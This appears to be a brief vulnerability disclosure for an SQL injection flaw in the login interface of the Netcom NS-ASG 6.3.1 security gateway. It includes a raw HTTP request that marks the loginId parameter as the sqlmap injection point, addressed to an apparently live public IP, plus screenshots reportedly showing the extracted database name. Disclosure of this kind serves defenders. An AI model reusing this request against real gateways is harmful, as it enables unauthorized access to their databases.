Netcom NS-ASG application security gateway has SQL injection vulnerability

version:NS-ASG 6.3.1

1.The login interface is as shown below

![image](https://github.com/willchen0011/cve/assets/13689053/e55e7648-8217-4ab1-8756-431747bad06c)

2.The loginId parameter exists and is injected into the database name through sqlmap.

```
GET /admin/singlelogin.php?submit=1&loginId=1* HTTP/1.1
Host: 218.75.78.54:4443
Cookie: PHPSESSID=08de4bddc8c53141eced1b928c54290d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 1.1.1.1
Te: trailers
Connection: close
```
![image](https://github.com/willchen0011/cve/assets/13689053/b24a66bf-3225-4d95-a1e9-273cdc8a3352)

![image](https://github.com/willchen0011/cve/assets/13689053/f296291e-5120-48c3-8436-5ae8e0fd16fb)
